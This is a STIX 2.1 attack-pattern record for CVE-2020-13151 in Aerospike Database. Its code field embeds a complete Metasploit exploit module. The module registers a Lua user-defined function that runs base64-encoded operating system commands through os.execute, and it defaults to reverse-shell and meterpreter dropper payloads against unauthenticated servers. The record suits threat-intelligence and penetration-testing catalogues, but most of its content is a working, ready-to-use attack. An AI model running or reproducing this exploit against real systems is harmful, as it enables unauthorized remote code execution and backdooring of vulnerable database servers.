{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fd5d48b-3cd4-46f0-bbec-e71b7697202d",
    "created": "2024-08-14T16:57:42.854749Z",
    "modified": "2024-08-14T16:57:42.854753Z",
    "name": "Aerospike Database UDF Lua Code Execution",
    "description": " Aerospike Database versions before 5.1.0.3 permitted user-defined functions (UDF) to call the `os.execute` Lua function.  This module creates a UDF utilising this function to execute arbitrary operating system commands with the privileges of the user running the Aerospike service.  This module does not support authentication; however Aerospike Database Community Edition does not enable authentication by default.  This module has been tested successfully on Ubuntu with Aerospike Database Community Edition versions 4.9.0.5, 4.9.0.11 and 5.0.0.10.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/aerospike_database_udf_cmd_exec.rb",
            "external_id": "aerospike_database_udf_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13151"
        },
        {
            "source_name": "reference",
            "url": "https://www.aerospike.com/enterprise/download/server/notes.html#5.1.0.3"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/b4ny4n/CVE-2020-13151"
        },
        {
            "source_name": "reference",
            "url": "https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.aerospike.com/docs/operations/manage/udfs/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Aerospike Database UDF Lua Code Execution',\n        'Description' => %q{\n          Aerospike Database versions before 5.1.0.3 permitted\n          user-defined functions (UDF) to call the `os.execute`\n          Lua function.\n\n          This module creates a UDF utilising this function to\n          execute arbitrary operating system commands with the\n          privileges of the user running the Aerospike service.\n\n          This module does not support authentication; however\n          Aerospike Database Community Edition does not enable\n          authentication by default.\n\n          This module has been tested successfully on Ubuntu\n          with Aerospike Database Community Edition versions\n          4.9.0.5, 4.9.0.11 and 5.0.0.10.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'b4ny4n', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'References' => [\n          ['EDB', '49067'],\n          ['CVE', '2020-13151'],\n          ['PACKETSTORM', '160106'],\n          ['URL', 'https://www.aerospike.com/enterprise/download/server/notes.html#5.1.0.3'],\n          ['URL', 'https://github.com/b4ny4n/CVE-2020-13151'],\n          ['URL', 'https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html'],\n          ['URL', 'https://www.aerospike.com/docs/operations/manage/udfs/'],\n        ],\n        'Platform' => %w[linux unix],\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Type' => :unix_command\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ],\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-07-31',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(3000)\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('UDF_DIRECTORY', [true, 'Directory where Lua UDF files are stored', '/opt/aerospike/usr/udf/lua/'])\n      ]\n    )\n  end\n\n  def build\n    header = ['02010000'].pack('H*')\n    data = \"build\\x0a\"\n    len = [data.length].pack('N')\n    sock.put(header + len + data)\n    sock.get_once\n  end\n\n  def remove_udf(name)\n    header = ['02010000'].pack('H*')\n    data = \"udf-remove:filename=#{name};\\x0a\"\n    len = [data.length].pack('N')\n    sock.put(header + len + data)\n    sock.get_once\n  end\n\n  def list_udf\n    header = ['02010000'].pack('H*')\n    data = \"udf-list\\x0a\"\n    len = [data.length].pack('N')\n    sock.put(header + len + data)\n    sock.get_once\n  end\n\n  def upload_udf(name, data, type = 'LUA')\n    header = ['02010000'].pack('H*')\n    content = Rex::Text.encode_base64(data)\n    data = \"udf-put:filename=#{name};content=#{content};content-len=#{content.length};udf-type=#{type};\\x0a\"\n    len = [data.length].pack('N')\n    sock.put(header + len + data)\n    sock.get_once\n  end\n\n  def features\n    header = ['02010000'].pack('H*')\n    data = \"features\\x0a\"\n    len = [data.length].pack('N')\n    sock.put(header + len + data)\n    sock.get_once\n  end\n\n  def execute_command(cmd, _opts = {})\n    fname = \"#{rand_text_alpha(12..16)}.lua\"\n    print_status(\"Creating UDF '#{fname}' ...\")\n\n    # NOTE: we manually remove the lua file as unregistering the UDF\n    # does not remove the lua file from disk.\n    cmd_exec = Rex::Text.encode_base64(\"rm '#{datastore['UDF_DIRECTORY']}/#{fname}'; #{cmd}\")\n\n    # NOTE: this jank to execute the payload in the background is required as\n    # sometimes the payload is executed twice (before the UDF is unregistered).\n    #\n    # Executing the payload in the foreground causes the thread to block while\n    # the second payload tries and fails to connect back.\n    #\n    # This would cause the subsequent call to unregister the UDF to fail,\n    # permanently backdooring the system (that's bad).\n    res = upload_udf(fname, %{os.execute(\"echo #{cmd_exec}|base64 -d|sh&\")})\n\n    return unless res.to_s.include?('error')\n\n    if /error=(?<error>.+?);.*message=(?<message>.+?)$/ =~ res\n      print_error(\"UDF registration failed: #{error}: #{Rex::Text.decode_base64(message)}\")\n    else\n      print_error('UDF registration failed')\n    end\n  ensure\n    # NOTE: unregistering the UDF is super important as leaving the UDF\n    # registered causes the payload to be executed repeatedly, effectively\n    # permanently backdooring the system (that's bad).\n    if remove_udf(fname).to_s.include?('ok')\n      vprint_status(\"UDF '#{fname}' removed successfully\")\n    else\n      print_warning(\"UDF '#{fname}' could not be removed\")\n    end\n  end\n\n  def check\n    connect\n\n    res = build\n\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    version = res.to_s.scan(/build\\s*([\\d.]+)/).flatten.first\n\n    unless version\n      return CheckCode::Safe('Target is not Aerospike Database')\n    end\n\n    vprint_status(\"Aerospike Database version #{version}\")\n\n    if Rex::Version.new(version) >= Rex::Version.new('5.1.0.3')\n      return CheckCode::Safe('Version is not vulnerable')\n    end\n\n    unless features.to_s.include?('udf')\n      return CheckCode::Safe('User defined functions are not supported')\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    # NOTE: maximum packet size is 65,535 bytes and we lose some space to\n    # packet overhead, command stager overhead, and double base64 encoding.\n    max_size = 35_000 # 35,000 bytes double base64 encoded is 63,874 bytes.\n    if payload.encoded.length > max_size\n      fail_with(Failure::BadConfig, \"Payload size (#{payload.encoded.length} bytes) is large than maximum permitted size (#{max_size} bytes)\")\n    end\n\n    print_status(\"Sending payload (#{payload.encoded.length} bytes) ...\")\n    case target['Type']\n    when :unix_command\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: max_size, background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-07-31",
    "x_mitre_platforms": [
        "linux'"
    ]
}